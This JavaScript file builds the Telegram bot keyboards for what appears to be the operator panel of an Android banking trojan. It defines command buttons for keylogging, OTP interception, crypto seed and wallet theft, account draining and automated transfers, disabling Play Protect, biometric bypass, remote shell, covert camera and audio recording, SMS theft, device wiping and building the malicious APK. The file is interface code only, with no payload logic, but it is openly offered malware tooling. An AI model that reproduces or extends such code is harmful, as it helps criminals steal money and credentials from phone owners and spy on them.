import { Markup } from 'telegraf';

export function mainKeyboard() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📱 DEVICES', 'menu_devices'),
     Markup.button.callback('🎥 HVNC', 'menu_hvnc'),
     Markup.button.callback('⌨️ KEYLOGGER', 'menu_keylog')],
    [Markup.button.callback('🔐 OTP GRAB', 'menu_otp'),
     Markup.button.callback('💰 CRYPTO', 'menu_crypto'),
     Markup.button.callback('📸 SCREEN', 'menu_screen')],
    [Markup.button.callback('🏦 BANKING', 'menu_banking'),
     Markup.button.callback('📁 FILES', 'menu_files'),
     Markup.button.callback('📍 LOCATION', 'menu_location')],
    [Markup.button.callback('🎙️ AUDIO', 'menu_audio'),
     Markup.button.callback('📹 CAMERA', 'menu_camera'),
     Markup.button.callback('📨 SMS', 'menu_sms')],
    [Markup.button.callback('🛡️ EVASION', 'menu_evasion'),
     Markup.button.callback('⚙️ SYSTEM', 'menu_system'),
     Markup.button.callback('💣 SABOTAGE', 'menu_sabotage')],
    [Markup.button.callback('📦 BUILD APK', 'build_apk'),
     Markup.button.callback('🌐 DASHBOARD', 'menu_dashboard')],
    [Markup.button.callback('📊 STATS', 'menu_stats'),
     Markup.button.callback('⚙️ SETTINGS', 'menu_settings'),
     Markup.button.callback('🔄 REFRESH', 'menu_refresh')],
  ]);
}

export function deviceListKeyboard(devices, page = 0) {
  const perPage = 6;
  const totalPages = Math.ceil(devices.length / perPage);
  const pageDevices = devices.slice(page * perPage, (page + 1) * perPage);
  const rows = pageDevices.map(d => ([
    Markup.button.callback(
      `${d.online ? '🟢' : '🔴'} ${d.info?.model || d.id.slice(0,8)} [${d.info?.battery||'?'}%]`,
      `select:${d.id}`
    )
  ]));
  if (totalPages > 1) {
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `dev_page:${page-1}`));
    nav.push(Markup.button.callback(`📄 ${page+1}/${totalPages}`, 'noop'));
    if (page < totalPages-1) nav.push(Markup.button.callback('➡️', `dev_page:${page+1}`));
    rows.push(nav);
  }
  rows.push([Markup.button.callback('🔙 MAIN MENU', 'menu_main')]);
  return Markup.inlineKeyboard(rows);
}

export function deviceControlKeyboard(id) {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📋 INFO', `cmd:${id}:info`),
     Markup.button.callback('🔋 BATT', `cmd:${id}:battery`),
     Markup.button.callback('📍 LOC', `cmd:${id}:location`)],
    [Markup.button.callback('📸 SCREENSHOT', `cmd:${id}:screenshot`),
     Markup.button.callback('🎥 HVNC', `cmd:${id}:hvnc_start`)],
    [Markup.button.callback('⌨️ KEYLOG ON', `cmd:${id}:keylog_on`),
     Markup.button.callback('⌨️ KEYLOG OFF', `cmd:${id}:keylog_off`)],
    [Markup.button.callback('🔐 OTP ON', `cmd:${id}:otp_on`),
     Markup.button.callback('🔐 OTP OFF', `cmd:${id}:otp_off`)],
    [Markup.button.callback('💰 BALANCE', `cmd:${id}:balance`),
     Markup.button.callback('💳 WALLETS', `cmd:${id}:wallets`)],
    [Markup.button.callback('📋 CLIPBOARD', `cmd:${id}:clipboard`),
     Markup.button.callback('🌱 SEED', `cmd:${id}:seed`)],
    [Markup.button.callback('🛡️ PLAY PROTECT OFF', `cmd:${id}:pp_off`),
     Markup.button.callback('🛡️ BIOMETRIC BYPASS', `cmd:${id}:biometric`)],
    [Markup.button.callback('💸 DRAIN', `cmd:${id}:drain`),
     Markup.button.callback('🔄 ATS', `cmd:${id}:transfer`)],
    [Markup.button.callback('🔓 UNLOCK', `cmd:${id}:unlock`),
     Markup.button.callback('🔒 LOCK', `cmd:${id}:lock`)],
    [Markup.button.callback('🎙️ REC AUDIO', `cmd:${id}:record_audio`),
     Markup.button.callback('📹 REC CAMERA', `cmd:${id}:record_camera`)],
    [Markup.button.callback('📁 FILES', `cmd:${id}:files`),
     Markup.button.callback('📞 CONTACTS', `cmd:${id}:contacts`)],
    [Markup.button.callback('📡 NETWORK', `cmd:${id}:network`),
     Markup.button.callback('🔌 SHELL', `cmd:${id}:shell`)],
    [Markup.button.callback('📨 SMS LIST', `cmd:${id}:sms_list`),
     Markup.button.callback('📲 CALL LOG', `cmd:${id}:call_log`)],
    [Markup.button.callback('📳 VIBRATE', `cmd:${id}:vibrate`),
     Markup.button.callback('🔦 FLASHLIGHT', `cmd:${id}:flashlight`)],
    [Markup.button.callback('🌐 OPEN URL', `cmd:${id}:open_url`),
     Markup.button.callback('📲 NOTIFICATION', `cmd:${id}:send_notification`)],
    [Markup.button.callback('🔇 MUTE', `cmd:${id}:mute`),
     Markup.button.callback('🔊 MAX VOL', `cmd:${id}:max_volume`)],
    [Markup.button.callback('💣 WIPE', `cmd:${id}:wipe`),
     Markup.button.callback('🔄 REBOOT', `cmd:${id}:reboot`)],
    [Markup.button.callback('🔙 BACK', 'menu_devices')],
  ]);
}
